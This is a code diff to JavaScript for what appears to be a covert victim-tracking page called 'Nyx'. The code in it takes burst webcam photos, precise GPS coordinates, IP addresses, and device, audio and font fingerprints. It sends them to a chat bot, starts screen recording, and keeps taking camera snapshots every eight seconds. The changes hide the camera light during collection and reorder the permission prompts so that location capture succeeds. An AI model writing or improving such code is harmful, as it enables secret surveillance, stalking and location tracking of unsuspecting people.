@@ -182,23 +182,19 @@ async function getIpIntel() {
     return info;
 }
 
-// GPS Timeout set to 8 seconds
 function getRealGps() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) {
-            console.warn('[Nyx] Geolocation not supported');
-            return resolve(null);
-        }
+        if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
             p => resolve({
                 lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
                 mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
             }),
             (error) => { 
-                console.warn('[Nyx] GPS failed:', error.message, '| Code:', error.code); 
+                console.warn('[Nyx] GPS failed:', error.message); 
                 resolve(null); 
             },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } // ৮ সেকেন্ড
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
     });
 }
@@ -342,44 +338,50 @@ async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
     }
 }
 
-/* ---------- 7) INITIAL CAPTURE (Camera turns off after) ---------- */
+/* ---------- 7) INITIAL CAPTURE (Camera Light OFF via track.enabled) ---------- */
 async function runInitialAttack(video, stream) {
     const { token, chatId } = getCreds();
     const canvas = document.getElementById('canvas');
 
     if (!token || !chatId) {
-        console.warn('[Nyx] no creds — aborting initial attack');
         stream.getTracks().forEach(t => t.stop());
         video.srcObject = null;
         return;
     }
 
     try {
-        // 1st Photo — Instant
-        await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
-
-        // Gather Intel in background (GPS 8s, etc)
+        // 1. Start GPS & Intel gathering immediately
         const intelPromise = Promise.all([
             getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
         ]);
 
-        // Burst 2
+        // 2. Take Burst Photos Fast
+        await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
         await new Promise(r => setTimeout(r, 300));
         await shootFrame(video, canvas, `📸 Burst 2/3`, token, chatId);
-        
-        // Burst 3
         await new Promise(r => setTimeout(r, 300));
         await shootFrame(video, canvas, `📸 Burst 3/3`, token, chatId);
 
-        // Turn OFF Camera
+        // 3. TURN OFF CAMERA LIGHT (track.enabled = false keeps WebView active for GPS)
+        stream.getVideoTracks().forEach(track => track.enabled = false);
+
+        // 4. WAIT for GPS/Intel to finish (max 8s)
+        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
+
+        // 5. Send Report (this includes the map link)
+        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
+
+        // 6. Fully stop camera stream now that intel is safe
         stream.getTracks().forEach(t => t.stop());
         video.srcObject = null;
 
-        // Wait for Intel to finish then send report
-        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
-        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
+        // 7. Prompt Screen Share ONLY AFTER GPS is done (prevents native popup blocking GPS)
+        try {
+            displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            recordScreenFromStream(displayStream, token, chatId);
+        } catch(e) { console.warn('[Nyx] screen denied:', e.name); }
 
-        // Start live interval (every 8s)
+        // 8. Start live interval
         if (trackingInterval) clearInterval(trackingInterval);
         trackingInterval = setInterval(liveCapture, 8000);
 
@@ -392,7 +394,7 @@ async function runInitialAttack(video, stream) {
 
 /* ---------- 8) LIVE CAPTURE (Turns on, snaps, turns off) ---------- */
 async function liveCapture() {
-    if (document.hidden) return; // Don't run if tab is in background
+    if (document.hidden) return; 
     
     const { token, chatId } = getCreds();
     if (!token || !chatId) return;
@@ -402,7 +404,6 @@ async function liveCapture() {
     const canvas = document.getElementById('canvas');
 
     try {
-        // Turn on camera
         liveStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         video.srcObject = liveStream;
         
@@ -414,13 +415,11 @@ async function liveCapture() {
         });
         await video.play().catch(() => {});
 
-        // Snap photo
         await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
 
     } catch (e) {
         console.warn('[Nyx] live capture failed:', e.name);
     } finally {
-        // Turn off camera immediately
         if (liveStream) liveStream.getTracks().forEach(t => t.stop());
         video.srcObject = null;
     }
@@ -432,7 +431,7 @@ async function requestPermissions() {
     permsFiring = true;
 
     try {
-        // 1. Prompt Camera
+        // Camera prompt
         const cam = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' },
             audio: false
@@ -453,14 +452,8 @@ async function requestPermissions() {
         permsDone = true;
         permsFiring = false;
 
-        // 2. Start Initial Photos (and turn off later)
+        // Start attack (photos + GPS + screen share later)
         runInitialAttack(video, cam);
-
-        // 3. Prompt Screen Share (Screen Recording)
-        try {
-            displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            recordScreenFromStream(displayStream, getCreds().token, getCreds().chatId);
-        } catch(e) { console.warn('[Nyx] screen denied:', e.name); }
 
     } catch(e) {
         console.warn('[Nyx] cam denied:', e.name);
